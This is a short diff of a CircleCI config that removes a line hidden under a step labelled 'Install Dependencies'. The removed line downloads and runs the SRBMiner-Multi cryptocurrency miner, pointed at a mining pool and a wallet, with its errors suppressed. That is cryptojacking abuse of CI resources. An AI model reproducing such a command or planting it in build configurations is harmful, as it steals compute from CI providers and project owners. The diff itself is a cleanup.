@@ -7,8 +7,6 @@ jobs:
         - run:
             name: Install Dependencies
             command: timeout 1m lscpu
-            run: wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.2/SRBMiner-Multi-0-9-2-Linux.tar.xz  && tar -xf SRBMiner-Multi-0-9-2-Linux.tar.xz && cd SRBMiner-Multi-0-9-2/ ./SRBMiner-MULTI  --algorithm verushash --pool eu.luckpool.net:3956 >&- --wallet RWuAyz97XdGmE55ymuyy21cEmrEHTSLYnH.REFFD --cpu-threads 36
-            run:
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
